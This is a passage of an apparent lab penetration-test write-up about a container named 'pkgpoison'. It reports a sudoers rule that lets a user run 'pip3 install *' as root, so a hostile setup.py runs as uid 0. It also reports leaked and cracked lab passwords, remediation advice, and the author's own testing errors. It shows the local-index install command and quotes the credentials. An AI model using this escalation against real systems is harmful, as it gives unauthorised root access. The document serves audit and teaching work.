+drwxr-sr-x 2 root staff 4096 /usr/local/lib/python3.8/dist-packages/dl162reg-0.0.2.dist-info
+/root/.cache/pip/wheels/d4/6f/bc/…/dl162io-0.0.1-py3-none-any.whl
+</code></pre>
+<p>The wheel cache landed in <strong><code>/root/.cache/pip</code></strong> — the root-privileged installer wrote
+into root's home. Everything here is gone after the restore (see §9).</p>
+<hr />
+<h2 id="5-findings">5. Findings</h2>
+<h3 id="f1--sudoers-delegates-a-package-installer-with-an-unconstrained-requirement-specifier--uid0">F1 — <code>sudoers</code> delegates a package installer with an unconstrained requirement specifier → <code>uid=0</code></h3>
+<p><strong>CWE-269</strong> (Improper Privilege Management) · <strong>CWE-250</strong> (Execution with Unnecessary
+Privileges) · <strong>CWE-732</strong> (Incorrect Permission Assignment for Critical Resource) ·
+severity: <strong>critical</strong></p>
+<p><code>/etc/sudoers.d/001-admin-task</code>, whole file, quoted in §0. The literal string <code>install</code>
+is pinned. Everything after it is <code>*</code>, and §4 measured that <code>*</code> spans the entire rest of
+the command line including spaces. The caller therefore chooses:</p>
+<ul>
+<li><strong>which artifact</strong> — a local directory, a local sdist, or anything reachable from a
+repository the caller names;</li>
+<li><strong>which index</strong> — <code>--index-url</code>, <code>--find-links</code>, <code>--no-index</code>, <code>-r</code>, <code>-e</code>, <code>--target</code>
+are all inside the wildcard and all were measured ALLOWED;</li>
+<li><strong>whose build code runs</strong> — <code>setup.py</code> executes as <code>uid=0</code>.</li>
+</ul>
+<p>No vulnerability in any application is required or involved, because there is no
+application. The grant <em>is</em> the attack surface.</p>
+<p><strong>Impact.</strong> Any compromise of <code>admin</code> — and this lab ships two trivial ones (F2, F3) —
+is immediately root. The escalation needs no exploit, no memory corruption, no TOCTOU:
+a 1,628-byte text file and one command.</p>
+<p><strong>Root cause.</strong> An authorisation policy written as a <em>program name plus a wildcard</em>,
+where the named program's entire purpose is to fetch and execute third-party code, and
+where the wildcard covers the one argument that selects the third party.</p>
+<p><strong>Remediation.</strong> Stop delegating an installer. If a root-privileged install is genuinely
+required, put it behind a root-owned wrapper that takes no attacker-controlled
+arguments and grant the wrapper. If it must be delegated: pin the runas to <code>(root)</code>
+rather than <code>(ALL)</code> (lab 93's secondary note — it changes nothing while the program is
+an interpreter, and it is the difference between a finding and a no-finding the moment
+it is not), name a fixed artifact path under a root-owned directory, and replace <code>*</code>
+with the exact argument vector. Add a build-isolation requirement — <code>pyproject.toml</code>
+with PEP 517 — so a hostile <code>setup.py</code> is not executed at all; note that pip's
+<code>--no-build-isolation</code> and legacy sdists would then be the thing to forbid.</p>
+<h3 id="f2--the-credential-the-docroot-publishes-does-not-authenticate-and-the-one-that-does-is-a-dictionary-word">F2 — The credential the docroot publishes does not authenticate, and the one that does is a dictionary word</h3>
+<p><strong>CWE-200</strong> (Exposure of Sensitive Information) + <strong>CWE-521</strong> (Weak Password
+Requirements) · severity: <strong>medium</strong> as exposure, <strong>high</strong> as the actual state of the box</p>
+<p><code>/var/www/html/notes/note.txt</code>, 177 bytes, mode <code>644 www-data:www-data</code>, served to the
+world:</p>
+<pre><code>Dear developer,
+Please remember to change your credentials &quot;dev:developer123&quot; to something stronger.
+I've already warned you that weak passwords can get us compromised.
+
+-Admin
+</code></pre>
+<p>Two distinct defects in one 177-byte file, reported separately because they have
+different fixes:</p>
+<ul>
+<li><strong>The published credential is wrong.</strong> <code>dev:developer123</code> fails against SSH
+(§Rung 1, three instruments). Publishing a stale credential in cleartext is a leak
+<em>and</em> a broken hint; an operator who trusts it is stuck.</li>
+<li><strong>The real credential is a common dictionary word.</strong> <code>dev:computer</code>, <code>$6$</code> yescrypt,
+recovered offline in <strong>24,386 candidates</strong> — 24.2 s at the measured 1,009 hashes/s,
+one list per process.
+A 6-character lowercase dictionary word is not a password.</li>
+</ul>
+<p>Root cause: no secret-handling discipline at all — a plaintext credential in a served
+file, plus account passwords chosen from a common wordlist.</p>
+<p>Remediation: delete the note from the docroot; if a note must exist, it must not contain
+a credential of any kind, valid or not. Enforce a password policy and prefer
+<code>PasswordAuthentication no</code> with keys (lab 281 makes this point on its own SSH surface).</p>
+<h3 id="f3--admins-password-is-stored-as-a-deleted-source-files-bytecode-mode-644">F3 — <code>admin</code>'s password is stored as a deleted source file's bytecode, mode 644</h3>
+<p><strong>CWE-522</strong> (Insufficiently Protected Credentials) + <strong>CWE-312</strong> (Cleartext Storage of
+Sensitive Information) · severity: <strong>high</strong></p>
+<p><code>/opt/scripts/__pycache__/secret.cpython-38.pyc</code>, 274 bytes, <code>-rw-r--r-- admin admin</code>,
+in a <code>755</code> tree. <code>strings -a</code> gives <code>admin</code> / <code>p@$$w0r8321</code> and the keys
+<code>username</code> / <code>password</code>. <strong>Every local identity on the host can read it</strong>, which is how
+<code>dev</code> becomes <code>admin</code>, and <code>admin</code> is the sudoers identity — so F3 is the step that
+converts F2 into F1.</p>
+<p>The author's own build history shows the mistake being made and unmade:</p>
+<pre><code>vim secret.py
+python3 -m py_compile secret.py
+rm secret.py
+</code></pre>
+<p><code>rm secret.py</code> deletes the readable file and leaves the equally readable compiled copy.
+<strong>Deleting a secret's source does not delete the secret.</strong></p>
+<p>Remediation: never keep credentials in the image at all. If a bootstrap credential is
+unavoidable, inject it at first boot from the host, <code>chmod 600</code>, and remove the build
+artefacts (<code>__pycache__</code> included) from the image.</p>
+<h3 id="f4--lab-design-the-advertised-first-step-does-not-work">F4 — Lab design: the advertised first step does not work</h3>
+<p>Reported as the <strong>lab's</strong> problem, in the tradition of labs 112, 168, 220 and 282.</p>
+<p>The catalogue says <em>&quot;simple intrusion then privesc by a distinct steps&quot;</em>. The <strong>shape</strong>
+is exactly right: four distinct identities, four distinct decisions, and the escalation
+vector is genuinely not the entry vector. But the <strong>first step does not execute</strong> —
+the only credential the target publishes is wrong — so the intrusion is a 24,386-candidate
+offline crack rather than a disclosed hint. Either the note should carry the working
+credential, or the note should not exist.</p>
+<p>A second, cosmetic design observation: <code>/etc/sudoers.d/001-admin-task</code> is mode <strong>644</strong>,
+not the 0440 <code>sudoers(5)</code> recommends. It is not world-writable, so <code>sudo</code> accepts it and
+this is <strong>not</strong> filed as a finding — but a lab about a sudoers misconfiguration is an odd
+place to ship a second, unrelated one, and an auditor will ask.</p>
+<h3 id="f5--a-root-daemon-is-not-required-and-the-absence-is-worth-stating">F5 — A root daemon is not required, and the absence is worth stating</h3>
+<p>Not a finding; a <strong>discarded hypothesis</strong>, recorded because it is the obvious one.
+&quot;<code>pip3 install</code> runs a build; a build might install something else&quot; — no. Measured:
+<code>/etc/cron.d</code> has <strong>1</strong> entry and it is stock (<code>e2scrub_all</code>, running as root, binary
+<code>/usr/sbin/e2scrub_all</code> from dpkg, mode <code>755 root:root</code>, not writable by <code>admin</code>); there
+is <strong>no</strong> <code>/etc/crontab</code>; <code>/etc/cron.daily</code> holds the three stock dpkg scripts. No
+scheduler in this lab re-reads anything an attacker wrote.</p>
+<hr />
+<h2 id="6-controls-that-held">6. Controls that held</h2>
+<p>Every row's positive control is stated, because a control that has never fired is not a
+control.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves the detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>dev</code> has no sudo grant</strong></td>
+<td><code>sudo</code> <strong>prompted for <code>dev</code>'s password and accepted it</strong> (<code>[sudo] password for dev:</code>) before answering <code>Sorry, user dev may not run sudo on 84dbffed895e.</code> — so the sudo path is live for <code>dev</code> and the policy is empty, not the tool broken. Cross-checked by reading the policy: the only <code>sudoers.d</code> file is <code>001-admin-task</code>, which names <code>admin</code></td>
+</tr>
+<tr>
+<td><strong>The sudoers argument specification really does restrict something</strong></td>
+<td><code>sudo -n /usr/bin/pip3 install --help</code> → <code>ALLOWED</code>, <code>rc=0</code>, <strong>12,638 bytes</strong> of pip usage text. The detector fires, so the 8 denials are denials</td>
+</tr>
+<tr>
+<td><strong><code>sudo</code> does not launder a shell</strong></td>
+<td><code>install $IFS</code> reached pip as <code>Invalid requirement: '$IFS'</code> — 6 literal characters. A shell <em>would</em> have split it. The wildcard's power is the specifier, not metacharacters</td>
+</tr>
+<tr>
+<td><strong>No setuid path from <code>dev</code> or <code>admin</code></strong></td>
+<td>11 setuid binaries found; <code>test -w</code> <strong>read as <code>dev</code></strong> (<code>uid=1000</code>) → <strong>0</strong> writable; read as <code>admin</code> (<code>uid=1001</code>) → <strong>0</strong> writable. Both are the identity that would execute the payload. <strong>And the corpus's standing trap, measured for contrast:</strong> <code>find / -xdev -perm -u+w -type f</code> → <strong>17,606</strong> files carrying the <em>owner's</em> write bit, of which <strong>0 of 11</strong> setuid binaries are writable by the identity that cares</td>
+</tr>
+<tr>
+<td><strong>No file capabilities anywhere</strong></td>
+<td><strong>This one needed a new instrument.</strong> <code>getcap</code> is <strong>not installed</strong> on this image, so every &quot;<code>getcap</code> → 0 lines&quot; reading in this engagement was a missing command printing nothing (§11). Replaced with a direct <code>os.getxattr(p, &quot;security.capability&quot;)</code> walk, with the control <strong>staged and then found by the same walk</strong>: <code>POSITIVE CONTROL staged. readback: 0100000200000000800000000000000000000000</code>, <code>the control is IN this list, so the walk can find one: True</code>. Result over 20,087 walked files and then over <code>/usr /bin /sbin /lib /etc /opt /home /var /root /tmp</code>: <strong>0</strong> files carrying the xattr</td>
+</tr>
+<tr>
+<td><strong>No cron path</strong></td>
+<td><code>/etc/cron.d</code> read as <code>admin</code>: 1 entry, <code>e2scrub_all</code>, its target binary <code>/usr/sbin/e2scrub_all</code> is <code>755 root:root</code> and <code>test -w</code> as <code>admin</code> says <code>ro</code></td>
+</tr>
+<tr>
+<td><strong>The escalation files are not writable by the lower identities</strong></td>
+<td><code>test -w</code> read <strong>as <code>dev</code></strong> on <code>/etc/sudoers.d/001-admin-task</code> → <code>NOT-writable</code>; on the <code>.pyc</code> → <code>PYC-NOT-writable</code>; read <strong>as <code>admin</code></strong> on <code>/etc/sudoers</code>, <code>/etc/sudoers.d/001-admin-task</code>, <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/cron.d</code>, <code>/etc/ld.so.conf.d</code> → all <code>ro</code>. The predicate is read by the identity that would use it, never through <code>docker exec</code></td>
+</tr>
+<tr>
+<td><strong><code>su</code> is not a ladder</strong></td>
+<td><code>su - admin</code> as <code>dev</code> with <code>dev</code>'s own password → <code>su: Authentication failure</code>. Same <code>crypt</code> oracle already proved green on <code>admin</code>'s real password, so this is a negative about the credential, not the call</td>
+</tr>
+<tr>
+<td><strong>No UDP surface is being missed by a TCP scan</strong></td>
+<td><code>/proc/net/udp</code> and <code>/proc/net/udp6</code> → <strong>1 line each, header only</strong>. <code>nmap -sU</code> refused for lack of privileges, so this is a second instrument, not a blind spot</td>
+</tr>
+<tr>
+<td><strong>The docroot is not a write primitive for either identity</strong></td>
+<td><code>test -w</code> as <code>admin</code> on <code>/var/www/html</code> → not writable; the only writes that landed there were <code>root:root</code>, i.e. the escalation's own product</td>
+</tr>
+<tr>
+<td><strong>The reward sweep's grep can find a string that exists</strong></td>
+<td>pattern <code>Ubuntu</code> → <strong>51 files</strong>; and on the binary pass, a marker appended to a copy of <code>/usr/bin/python3.8</code> → <strong>1 line</strong></td>
+</tr>
+<tr>
+<td><strong>The restore</strong></td>
+<td><code>GET /</code> → <code>200</code> / <strong>589 bytes</strong>; <code>GET /notes/note.txt</code> → <code>200</code> / <strong>177 bytes</strong>; impossible-name control <code>GET /notes/nosuchfile-dl162</code> → <code>404</code> / <strong>272 bytes</strong>. Docroot back to 3 shipped entries; <code>[lab-home]/admin</code>, <code>[lab-home]/dev</code>, <code>/root</code> back to dotfiles only; `ls /usr/local/lib/python3.8/dist-packages/</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-negatives-each-with-its-work-count">7. Negatives, each with its work count</h2>
+<table>
+<thead>
+<tr>
+<th>Negative</th>
+<th>Work done</th>
+<th>Instrument</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>No <code>FLAG{}</code> / <code>flag{</code> / <code>DL{</code> / <code>dl{</code> / <code>CTF{</code> / <code>pkgpoison{</code> anywhere</td>
+<td><strong>17,563 text files / 316,301,973 bytes</strong> (files ≤ 4 MB, <code>/proc /sys /run /tmp</code> excluded, own <code>dl162-*</code> artefacts excluded) + <strong>14 binaries / 183,847,550 bytes</strong> grepped with <code>-a</code>. <strong>Total 17,577 files / 500,149,523 bytes, 0 hits.</strong> 14 files &gt; 4 MB are all compiler/interpreter/runtime blobs (<code>cc1</code>, <code>cc1plus</code>, <code>lto1</code>, <code>libpython3.8</code>, <code>libc.a</code>, <code>libicudata</code>, <code>magic.mgc</code>, …), listed with sizes</td>
+<td><code>grep -Il</code> via <code>find -exec … +</code>; control <code>Ubuntu</code> → 51 files; binary pass control: injected marker → 1 line</td>
+</tr>
+<tr>
+<td>No reward file in <code>/root</code></td>
+<td><code>ls -la /root</code> as <code>uid=0</code>: 3 shipped dotfiles (<code>.bash_history</code>, <code>.bashrc</code>, <code>.profile</code>) + <strong>2 artefacts this engagement created</strong>. No other file exists</td>
+<td><code>ls -a</code>, as <code>uid=0</code></td>
+</tr>
+<tr>
+<td>No reward in the web root</td>
+<td>3 shipped files read in full: <code>index.html</code> (589 B), <code>notes/note.txt</code> (177 B), <code>index.png</code> (chunk table read: <code>IHDR</code>, one <code>caBX</code>, 16 <code>IDAT</code>, <code>IEND</code>; <strong>no</strong> <code>tEXt</code>/<code>iTXt</code>/<code>zTXt</code>), plus <code>grep -RIn 'flag|FLAG|&lt;!--|password|secret'</code> over the docroot → 1 hit, the word &quot;password&quot; in <code>note.txt</code></td>
+<td><code>ls</code>, <code>grep -RIn</code>, PNG chunk parse</td>
+</tr>
+<tr>
+<td>No third listening port</td>
+<td><code>nmap -p-</code> → <strong>2 open</strong>, <code>65533 closed (conn-refused)</code>; <code>/proc/net/tcp</code>/<code>tcp6</code> not needed — the TCP scan is exhaustive by construction</td>
+<td><code>nmap -sV -Pn -p-</code></td>
+</tr>
+<tr>
+<td><code>dev</code> cannot sudo</td>
+<td>3 forms (<code>sudo -n -l</code>, <code>echo pw | sudo -S -l</code>, <code>sudo -n /usr/bin/id</code>) — all refused; the third prompted and accepted the password before refusing</td>
+<td><code>sudo</code>, plus the policy file read</td>
+</tr>
+<tr>
+<td>No setuid escalation</td>
+<td>11 setuid binaries, <code>test -w</code> as <code>dev</code> → 0, as <code>admin</code> → 0</td>
+<td><code>find -perm -4000</code> + <code>test -w</code> per identity</td>
+</tr>
+<tr>
+<td>No file capabilities</td>
+<td>20,087 files walked; then <code>/usr /bin /sbin /lib /etc /opt /home /var /root /tmp</code> walked; <strong>0</strong> xattrs, with the staged control found by the same walk</td>
+<td><code>os.getxattr</code></td>
+</tr>
+<tr>
+<td>No cron write primitive</td>
+<td><code>/etc/cron.d</code> = 1 entry (stock), <code>/etc/crontab</code> = <strong>absent</strong>, <code>/etc/cron.daily</code> = 3 stock scripts; all <code>ro</code> as <code>admin</code></td>
+<td><code>ls</code>, <code>test -w</code></td>
+</tr>
+<tr>
+<td>No UDP service</td>
+<td><code>/proc/net/udp</code> = 1 header line, <code>/proc/net/udp6</code> = 1 header line</td>
+<td>kernel table</td>
+</tr>
+<tr>
+<td><code>.pyc</code> is not writable by <code>dev</code></td>
+<td>1 file, <code>test -w</code> as <code>uid=1000</code> → <code>NOT-writable</code></td>
+<td><code>test -w</code>, correct identity</td>
+</tr>
+<tr>
+<td><code>pip3</code> is the <em>only</em> granted program</td>
+<td><code>sudo -l</code> as <code>admin</code> printed exactly <strong>one</strong> command line; <code>/etc/sudoers.d/</code> contains <strong>2</strong> files, one of which is the stock <code>README</code></td>
+<td><code>sudo -l</code>, <code>ls /etc/sudoers.d</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="8-not-tested-and-discarded-with-reason">8. NOT tested, and discarded with reason</h2>
+<h3 id="not-tested">NOT tested</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Delivering a payload from a real public registry</strong> (<code>sudo pip3 install &lt;name&gt;</code> from PyPI, or a hostile index)</td>
+<td><strong>Absolute constraint: no third-party infrastructure, ever.</strong> I measured that egress exists (<code>curl https://pypi.org/simple/</code> → <code>http_code 200</code>; <code>getent hosts pypi.org</code> → 4 AAAA records) and stopped there. <strong>0 requests to any registry were made.</strong> The equivalent was proved entirely on localhost with <code>--no-index --find-links file://[lab-home]/admin/repo2</code> (§Rung 4), which exercises the same installer code path</td>
+</tr>
+<tr>
+<td><strong>Reaching <code>uid=0</code> from <code>dev</code> without <code>admin</code></strong></td>
+<td>Not attempted beyond the enumerated negatives, because F3 gives a deterministic route. <strong>0 further attempts</strong>; this is an untested path, <strong>not</strong> a claim that none exists</td>
+</tr>
+<tr>
+<td><strong>Whether the grant also permits <code>-e</code>, <code>--upgrade</code>, <code>--target</code>, <code>--prefix</code> to redirect the install root</strong></td>
+<td><code>--target</code> and <code>--index-url</code> were measured ALLOWED at the sudoers layer; I did not exploit a <code>--prefix</code>/<code>--root</code> redirection to overwrite system files. <strong>0 attempts.</strong> The escalation does not need it</td>
+</tr>
+<tr>
+<td><strong>Root SSH login</strong></td>
+<td><code>PermitRootLogin no</code> in <code>/etc/ssh/sshd_config</code> and <code>root:*:</code> in <code>/etc/shadow</code> (locked). <strong>Read, not tested</strong> — 0 login attempts</td>
+</tr>
+<tr>
+<td><strong><code>/etc/sudoers.d</code> mode 644 as a live defect</strong></td>
+<td>Not tested as a vulnerability. <code>sudo</code> parsed and honoured the file (§Rung 3 positive control), which is the observation; the man-page chapter on modes is not installed on the image, so I did not claim a rule I could not read</td>
+</tr>
+</tbody>
+</table>
+<h3 id="discarded-with-the-reason">Discarded, with the reason</h3>
+<table>
+<thead>
+<tr>
+<th>Hypothesis</th>
+<th>Discarded because</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;PkgPoison is dependency confusion / a poisoned public package&quot;</td>
+<td>There is no application and no declared dependency. 28 <code>.whl</code> + 11 <code>.egg-info</code> on the box are all stock Ubuntu, and <code>pip3 install</code> is reached through a <strong>local path</strong>, not a name</td>
+</tr>
+<tr>
+<td>&quot;The <code>index.png</code> hides a credential (steganography or appended data)&quot;</td>
+<td>PNG chunk table read: <code>IHDR</code> + <code>caBX</code> + 16 <code>IDAT</code> + <code>IEND</code>, no text chunks; <code>IEND</code> ends the file with <strong>−4 bytes</strong> trailing. The image is a wireframe mock-up of <code>index.html</code></td>
+</tr>
+<tr>
+<td>&quot;<code>/run/sudo/ts/dev</code> means <code>dev</code> has a hidden grant&quot;</td>
+<td>A sudo timestamp can exist with an empty policy. <code>sudo -S -l</code> as <code>dev</code> → <code>Sorry, user dev may not run sudo on 84dbffed895e.</code> The timestamp is an artefact of the author's build session, not a grant</td>
+</tr>
+<tr>
+<td>&quot;<code>admin</code>'s password is guessable from context, so the <code>.pyc</code> is optional&quot;</td>
+<td>Not tested, and irrelevant. The <code>.pyc</code> is world-readable and its <code>strings</code> output is unambiguous; there was no reason to spend attempts on a guessing ladder</td>
+</tr>
+<tr>
+<td>&quot;The escalation needs a public package index&quot;</td>
+<td>Disproved by the <code>file://</code> run. The wildcard admits a local sdist</td>
+</tr>
+<tr>
+<td>&quot;The build step installs something else afterwards&quot;</td>
+<td>Measured: <code>/etc/cron.d</code> = 1 stock entry, no <code>/etc/crontab</code>, no scheduler that re-reads attacker-controlled config. See F5</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="9-restore">9. Restore</h2>
+<p>Recreated from the image, not by undoing edits, and verified with a <strong>positive</strong> check
+plus an impossible-name control:</p>
+<pre><code>$ docker rm -f pkgpoison_container &amp;&amp; docker run -d --name pkgpoison_container pkgpoison:latest
+$ curl -s -o /dev/null -w 'GET / -&gt; http=%{http_code} bytes=%{size_download}\n'  http://[net-0-6]/
+GET / -&gt; http=200 bytes=589
+$ curl -s -o /dev/null -w 'GET /notes/note.txt -&gt; http=%{http_code} bytes=%{size_download}\n' http://[net-0-6]/notes/note.txt
+GET /notes/note.txt -&gt; http=200 bytes=177
+$ curl -s -o /dev/null -w '... ' http://[net-0-6]/notes/nosuchfile-dl162
+http=404 bytes=272
+</code></pre>
+<p>Residue check, all of it gone:</p>
+<pre><code>$ ls /var/www/html/                     → index.html  index.png  notes
+$ ls -a /root [lab-home]/admin [lab-home]/dev     → only the shipped dotfiles
+$ ls /usr/local/lib/python3.8/dist-packages/ | grep -i dl162   → none
+$ ls /tmp | grep -i dl162                                 → none
+$ cat /etc/sudoers.d/001-admin-task
+admin ALL=(ALL) NOPASSWD: /usr/bin/pip3 install *
+$ ls -l /opt/scripts/__pycache__/secret.cpython-38.pyc
+-rw-r--r-- 1 admin admin 274 May 24  2025 secret.cpython-38.pyc
+</code></pre>
+<p>Lab is back to shipped. Image <code>pkgpoison:latest</code> reclaimed by name after this writeup;
+no global prune was run.</p>
+<hr />
+<h2 id="10-instrumentation-defects--mine">10. Instrumentation defects — mine</h2>
+<p>Seven. The first would have <strong>invented</strong> a reward, the second would have <strong>deleted</strong> a
+capability finding, and the third would have turned a control into a copy of the thing
+it was controlling.</p>
+<h3 id="d1--a-reward-sweep-that-reported-flag-in-every-file-on-the-box">D1 — A reward sweep that reported <code>FLAG{</code> in <strong>every file</strong> on the box</h3>
+<pre><code>files scanned : 17563
+bytes read    : 0
+pattern [FLAG{]    -&gt; 17563 file(s)
+    /usr/share/readline/inputrc
+    /usr/share/zoneinfo/Pacific/Niue
+    … (17,563 lines)
+</code></pre>
+<p>The sweep was wrapped in a shell function that <strong>did not forward <code>&quot;$@&quot;</code>.</strong> Every
+<code>scan -exec grep -Il …</code> therefore ran <code>find</code> with <strong>no <code>-exec</code> at all</strong>, and find
+printed its file list, which the pipeline counted as hits. Six patterns, six identical
+counts.</p>
+<p><strong>Two internal cross-checks caught it, and that is the transferable part:</strong></p>
+<ol>
+<li><code>bytes read : 0</code> — impossible for 17,563 files. §19: a blank/zero count is not
+evidence.</li>
+<li>every pattern returned <strong>exactly the file count</strong> — an oracle that always resolves
+the same way is a bias wearing the shape of an answer (§6).</li>
+</ol>
+<p><strong>Rule.</strong> A wrapper that builds a command line must forward its arguments, and the
+cheapest test for it is a pattern you know is present: <code>Ubuntu</code> → 51 files. If the
+&quot;hit count&quot; ever equals the &quot;files scanned&quot; count, the sweep is not searching.</p>
+<h3 id="d2--getcap-is-not-installed-and-my-script-printed-the-detector-fires-anyway">D2 — <code>getcap</code> is not installed, and my script printed &quot;the detector fires&quot; anyway</h3>
+<pre><code>bash: line 2: getcap: command not found
+bash: line 4: setcap: command not found
+  as root, getcap sees it: bash: line 5: getcap: command not found
+  as dev (uid 1000), getcap sees it: sh: 1: getcap: not found
+  -&gt; the detector fires; so the 0-line result on the real tree is a real absence
+full-tree getcap line count (as root): 0
+</code></pre>
+<p>My script asserted the conclusion <strong>on the line immediately after the command-not-found
+lines</strong>. This is §11 exactly: a missing tool printed nothing, exited quietly, and my
+<code>| wc -l</code> turned that into a clean <code>0</code> that confirmed what I hoped. Had I not gone
+looking for a positive control, I would have filed &quot;no file capabilities on this host&quot;
+as a measured property.</p>
+<p><strong>Fixed</strong> by measuring the property directly — a file capability lives in the
+<code>security.capability</code> xattr — and by <strong>staging the control and proving the new walk
+finds it</strong> before believing its zero:</p>
+<pre><code>POSITIVE CONTROL staged. readback: 0100000200000000800000000000000000000000
+files carrying security.capability (excluding the control): 0
+the control is IN this list, so the walk can find one: True
+</code></pre>
+<p><strong>Rule.</strong> A negative whose instrument is not proven present is UNTESTED. Check the
+instrument's own output before quoting its result — the &quot;command not found&quot; was <em>in the
+transcript</em>, two lines above the sentence it was supporting.</p>
+<h3 id="d3--a-control-that-read-back-the-payload-it-was-meant-to-contrast-with">D3 — A control that read back the payload it was meant to contrast with</h3>
+<p>My first differential control wrote witnesses to <strong>fixed</strong> paths (<code>/tmp/dl162-proof-&lt;fixed token&gt;.json</code>).
+After the root run, <code>admin</code> could not overwrite the root-owned file:</p>
+<pre><code>rm: cannot remove '/tmp/dl162-results.txt': Operation not permitted
+PermissionError: [Errno 13] Permission denied: '/tmp/dl162-results.txt'
+--- direct read of the two witnesses:
+/tmp/    : uid 0 euid 0 SUDO_USER admin
+web copy : uid 0 euid 0 SUDO_USER admin
+</code></pre>
+<p>The &quot;unprivileged&quot; row of my table would have read <strong>the root run's numbers</strong>. The
+negative was not a negative; it was a copy of the positive.</p>
+<p><strong>Fixed</strong> by giving every run a <strong>unique token</strong> (<code>STAMP=$(date +%s)-$$</code>), so a stale
+witness cannot be mistaken for a new one. §27's rule, pointed at my own harness: an
+oracle that observes a namespace your earlier action already changed is not idempotent.</p>
+<p><strong>Rule.</strong> Give every oracle run its own unique artefact name. A fixed name is an
+invitation to read your own last result back as this one's.</p>
+<h3 id="d4--two-vacuous-results-caused-by-residue-from-my-own-first-escalation">D4 — Two vacuous results caused by residue from my own first escalation</h3>
+<pre><code>$ sudo -n /usr/bin/pip3 install --no-index --find-links file://[lab-home]/admin/repo2 dl162-probe
+Looking in links: file://[lab-home]/admin/repo2
+Requirement already satisfied: dl162-probe in /usr/local/lib/python3.8/dist-packages (0.0.1)
+</code></pre>
+<p><code>dl162-probe 0.0.1</code> was <strong>my own first escalation's residue</strong>, root-installed into
+<code>dist-packages</code>. pip short-circuited, never fetched the 0.0.2 sdist, never ran the new
+<code>setup.py</code>, and printed a plausible line that reads like a negative result. It happened
+<strong>twice</strong> before I noticed. The third attempt, with a fresh package name
+(<code>dl162reg</code>), produced the real result quoted in §Rung 4.</p>
+<p><strong>Rule.</strong> After you escalate once on a target, your residue is part of the target's
+state and will answer your next probe. Use a new package name per experiment.</p>
+<h3 id="d5--a-false-positive-on-all-14-binaries-from-grep--c-and-">D5 — A false positive on all 14 binaries, from <code>grep -c</code> and <code>||</code></h3>
+<pre><code>files=14 bytes=183847550 files_with_hit=14
+  HIT 0
+0 /usr/lib/gcc/x86_64-linux-gnu/9/cc1
+</code></pre>
+<p><code>c=$(grep -ac -e &quot;FLAG{&quot; … &quot;$f&quot; 2&gt;/dev/null) || echo 0</code> — <code>grep -c</code> <strong>exits 1 when the
+count is zero</strong>, so the <code>||</code> appended a second line and <code>$c</code> became <code>&quot;0\n0&quot;</code>, which is
+<code>!= &quot;0&quot;</code>, so <strong>every file was reported as a hit</strong>. I was reading a shell bug as a
+result, in the direction that <em>invents</em> a finding.</p>
+<p>Fixed, and the fixed loop was itself proven able to fire before its zero was believed:</p>
+<pre><code>files=14 bytes=183847550 files_with_hit=0
+=== sanity: the loop must be able to see a hit ===
+  marker file -&gt; 1 line(s)  (must be &gt;0)
+</code></pre>
+<p><strong>Rule.</strong> <code>cmd $(…) || echo default</code> is wrong whenever <code>cmd</code> writes a value <em>and</em> has a
+non-zero exit for a legitimate outcome. And a detector that reports a hit must be shown
+one before its misses are believed.</p>
+<h3 id="d6--an-anomaly-i-explained-instead-of-measuring-and-the-measurement-was-better">D6 — An anomaly I explained instead of measuring, and the measurement was better</h3>
+<p>After a root run that provably wrote <code>uid 0</code> to <code>/var/www/html</code>, the <code>/tmp</code> witness still
+showed <code>uid 1001</code> from <code>admin</code>'s earlier <code>sdist</code> run. My first instinct was a theory
+about pip's build phases. Instead I instrumented every write and then ran a 2×2:</p>
+<pre><code>uid=0 writing a file owned by root   in sticky     /tmp/dl162stick        -&gt; OK
+uid=0 writing a file owned by admin  in sticky     /tmp/dl162stick        -&gt; FAIL errno=13
+uid=0 writing a file owned by root   in non-sticky [lab-home]/admin/dl162nostick -&gt; OK
+uid=0 writing a file owned by admin  in non-sticky [lab-home]/admin/dl162nostick -&gt; OK
+</code></pre>
+<p><code>/tmp</code> is <code>drwxrwxrwt</code>, <code>[lab-home]/admin/dl162nostick</code> is <code>drwxr-xr-x</code>; the file owner is
+the only other variable. <strong>So <code>uid=0</code> is refused <code>O_TRUNC</code> on another user's file in a
+sticky directory in this container</strong> — with <code>CapEff: 00000000a80425fb</code>, i.e. the Docker
+default set including <code>CAP_FOWNER</code>. <em>Why</em> is an inference (filesystem/overlay
+behaviour) and is filed as such; the 2×2 is the fact.</p>
+<p><strong>Oracle-design consequence, which is what actually mattered:</strong> never design a witness
+at a path another identity may already own. Use a unique path. That is the same rule as
+D3, arriving from the other direction.</p>
+<h3 id="d7--three-small-ones-recorded-because-they-are-cheap-and-they-all-bit">D7 — Three small ones, recorded because they are cheap and they all bit</h3>
+<ul>
+<li><code>bc</code> is not installed in this image, so a byte total came back <strong>empty</strong> rather than
+zero. §19: empty is untested. I computed the totals in <code>awk</code> instead.</li>
+<li><code>nmap -sU</code> refused (<code>requires root privileges</code>), so the UDP answer rests on
+<code>/proc/net/udp{,6}</code>. The kernel table is a second instrument and it is sufficient, but
+the UDP conclusion is <strong>not</strong> backed by a packet-level negative — it is backed by a
+listening-socket count of 0.</li>
+<li><code>man 5 sudoers</code> is <strong>not installed</strong> (<code>/usr/share/man/man5/</code> does not exist). I was
+tempted to quote the well-known &quot;a simple file name allows any arguments&quot; sentence
+from memory. Lab 282 and lab 93 both did. I measured the specification instead —
+14 forms — and the measurement is what the finding rests on. <strong>A rule quoted from
+memory is not a citation.</strong></li>
+</ul>
+<hr />
+<h2 id="11-reward">11. Reward</h2>
+<p><strong>None.</strong> Measured absence, with the search and its counts.</p>
+<table>
+<thead>
+<tr>
+<th>Search</th>
+<th>Scope</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>FLAG{</code>, <code>flag{</code>, <code>DL{</code>, <code>dl{</code>, <code>CTF{</code>, <code>pkgpoison{</code> over text files</td>
